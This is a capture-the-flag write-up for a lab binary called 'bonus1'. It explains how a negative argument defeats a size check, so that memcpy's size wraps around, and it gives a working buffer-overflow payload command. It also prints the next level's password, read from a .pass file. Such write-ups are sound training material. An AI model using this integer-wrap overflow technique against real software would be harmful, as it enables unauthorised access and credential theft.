# Write up

Small reminder (again) :
```
scp -P 4242 bonus1@192.168.0.33:bonus1 bin11
objdump -M intel -d bin11 > asm11_intel.txt
```

Here we have a check with the argv1 atoi result and `1464814662`.
However the atoi max value is 9, the memcpy call can read at most `9 * 4` chars, so 38, but we need 40 chars to overflow the buffer (and overwrite the stored atoi int).
We quickly notice that we can cause an underflow since there is no check for under 0 variable : 
```
$ ./bonus1 -1 ""
Segmentation fault (core dumped)
```
We need 44 bytes to overwrite the atoi value. (We can take more, but here we do the things good)
memcpy uses a size_t, which is an uint_32t on 32-bit systems.
We need to get an int value which gives 11 in unsigned in order to have 44 bytes copied, then we inject `\x46\x4c\x4f\x57` to bypass the condition.
Here we go :
```
Using this website : https://www.binaryconvert.com/result_signed_int.html?hexadecimal=8000000B
We get this number : -2147483637 which is 11 in unsigned excluding the sign bit.
Sample payload :
./bonus1 -2147483637 `python -c 'print "a" * 40 + "\x46\x4c\x4f\x57"'`
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
Done, gg ez